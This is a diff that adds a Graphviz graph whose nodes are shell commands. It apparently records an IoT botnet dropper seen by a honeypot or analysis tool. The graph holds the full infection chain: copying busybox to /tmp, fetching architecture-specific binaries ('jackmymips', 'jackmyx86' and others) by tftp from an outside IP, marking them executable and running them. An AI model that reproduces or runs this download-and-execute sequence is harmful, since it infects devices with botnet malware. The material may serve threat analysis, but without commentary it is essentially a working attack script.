@@ -1,0 +1,160 @@
+digraph {
+0 [label="ulimit -n 999999 "];
+0 -> 0
+2 [label="cp /bin/busybox /tmp/ "];
+2 -> 2
+148 [label="cd /tmp "];
+148 -> 148
+6 [label="tftp -r jackmymips -g 173.212.225.13 "];
+6 -> 8 [label=";,"];
+8 [label="cat jackmymips badbox "];
+8 -> 154 [label=";,"];
+154 [label="badbox "];
+154 -> 154
+156 [label="chmod +x * "];
+156 -> 157 [label=";,"];
+157 [label="./badbox "];
+157 -> 148 [label=";,"];
+148 [label="cd /tmp "];
+148 -> 148
+18 [label="tftp -r jackmymipsel -g 173.212.225.13 "];
+18 -> 20 [label=";,"];
+20 [label="cat jackmymipsel badbox "];
+20 -> 154 [label=";,"];
+154 [label="badbox "];
+154 -> 154
+156 [label="chmod +x * "];
+156 -> 157 [label=";,"];
+157 [label="./badbox "];
+157 -> 148 [label=";,"];
+148 [label="cd /tmp "];
+148 -> 148
+30 [label="tftp -r jackmysh4 -g 173.212.225.13 "];
+30 -> 32 [label=";,"];
+32 [label="cat jackmysh4 badbox "];
+32 -> 154 [label=";,"];
+154 [label="badbox "];
+154 -> 154
+156 [label="chmod +x * "];
+156 -> 157 [label=";,"];
+157 [label="./badbox "];
+157 -> 148 [label=";,"];
+148 [label="cd /tmp "];
+148 -> 148
+42 [label="tftp -r jackmyx86 -g 173.212.225.13 "];
+42 -> 44 [label=";,"];
+44 [label="cat jackmyx86 badbox "];
+44 -> 154 [label=";,"];
+154 [label="badbox "];
+154 -> 154
+156 [label="chmod +x * "];
+156 -> 157 [label=";,"];
+157 [label="./badbox "];
+157 -> 148 [label=";,"];
+148 [label="cd /tmp "];
+148 -> 148
+54 [label="tftp -r jackmyarmv6 -g 173.212.225.13 "];
+54 -> 56 [label=";,"];
+56 [label="cat jackmyarmv6 badbox "];
+56 -> 154 [label=";,"];
+154 [label="badbox "];
+154 -> 154
+156 [label="chmod +x * "];
+156 -> 157 [label=";,"];
+157 [label="./badbox "];
+157 -> 148 [label=";,"];
+148 [label="cd /tmp "];
+148 -> 148
+66 [label="tftp -r jackmyi686 -g 173.212.225.13 "];
+66 -> 68 [label=";,"];
+68 [label="cat jackmyi686 badbox "];
+68 -> 154 [label=";,"];
+154 [label="badbox "];
+154 -> 154
+156 [label="chmod +x * "];
+156 -> 157 [label=";,"];
+157 [label="./badbox "];
+157 -> 148 [label=";,"];
+148 [label="cd /tmp "];
+148 -> 148
+78 [label="tftp -r jackmypowerpc -g 173.212.225.13 "];
+78 -> 80 [label=";,"];
+80 [label="cat jackmypowerpc badbox "];
+80 -> 154 [label=";,"];
+154 [label="badbox "];
+154 -> 154
+156 [label="chmod +x * "];
+156 -> 157 [label=";,"];
+157 [label="./badbox "];
+157 -> 148 [label=";,"];
+148 [label="cd /tmp "];
+148 -> 148
+90 [label="tftp -r jackmyi586 -g 173.212.225.13 "];
+90 -> 92 [label=";,"];
+92 [label="cat jackmyi586 badbox "];
+92 -> 154 [label=";,"];
+154 [label="badbox "];
+154 -> 154
+156 [label="chmod +x * "];
+156 -> 157 [label=";,"];
+157 [label="./badbox "];
+157 -> 148 [label=";,"];
+148 [label="cd /tmp "];
+148 -> 148
+102 [label="tftp -r jackmym86k -g 173.212.225.13 "];
+102 -> 104 [label=";,"];
+104 [label="cat jackmym86k badbox "];
+104 -> 154 [label=";,"];
+154 [label="badbox "];
+154 -> 154
+156 [label="chmod +x * "];
+156 -> 157 [label=";,"];
+157 [label="./badbox "];
+157 -> 148 [label=";,"];
+148 [label="cd /tmp "];
+148 -> 148
+114 [label="tftp -r jackmysparc -g 173.212.225.13 "];
+114 -> 116 [label=";,"];
+116 [label="cat jackmysparc badbox "];
+116 -> 154 [label=";,"];
+154 [label="badbox "];
+154 -> 154
+156 [label="chmod +x * "];
+156 -> 157 [label=";,"];
+157 [label="./badbox "];
+157 -> 148 [label=";,"];
+148 [label="cd /tmp "];
+148 -> 148
+126 [label="tftp -r jackmyarmv4 -g 173.212.225.13 "];
+126 -> 128 [label=";,"];
+128 [label="cat jackmyarmv4 badbox "];
+128 -> 154 [label=";,"];
+154 [label="badbox "];
+154 -> 154
+156 [label="chmod +x * "];
+156 -> 157 [label=";,"];
+157 [label="./badbox "];
+157 -> 148 [label=";,"];
+148 [label="cd /tmp "];
+148 -> 148
+138 [label="tftp -r jackmyarmv5 -g 173.212.225.13 "];
+138 -> 140 [label=";,"];
+140 [label="cat jackmyarmv5 badbox "];
+140 -> 154 [label=";,"];
+154 [label="badbox "];
+154 -> 154
+156 [label="chmod +x * "];
+156 -> 157 [label=";,"];
+157 [label="./badbox "];
+157 -> 148 [label=";,"];
+148 [label="cd /tmp "];
+148 -> 148
+150 [label="tftp -r jackmypowerpc440 -g 173.212.225.13 "];
+150 -> 152 [label=";,"];
+152 [label="cat jackmypowerpc440 badbox "];
+152 -> 154 [label=";,"];
+154 [label="badbox "];
+154 -> 154
+156 [label="chmod +x * "];
+156 -> 157 [label=";,"];
+}
